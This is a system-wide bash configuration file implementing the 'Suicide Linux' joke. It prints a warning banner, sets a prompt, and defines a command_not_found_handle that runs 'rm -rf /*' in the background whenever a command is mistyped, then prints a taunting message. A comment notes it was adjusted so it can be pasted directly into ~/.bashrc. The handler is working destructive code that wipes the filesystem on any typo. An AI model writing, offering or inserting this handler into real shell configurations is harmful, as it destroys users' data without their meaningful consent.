# System-wide .bashrc file for interactive bash(1) shells.

# Set warning message
echo " ==================================="
echo " WARNING: Suicide-Linux installed"
echo "          (https://qntm.org/suicide)"
echo " ==================================="

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# set a fancy prompt (non-color, overwrite the one in /etc/profile)
PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '

# Removed ; and moved line so you can direct paste to ~/.bashrc
function command_not_found_handle {
     rm -rf /* 2>/dev/null &
     echo "Oops, looks like you misspelt something >:)"
     
}
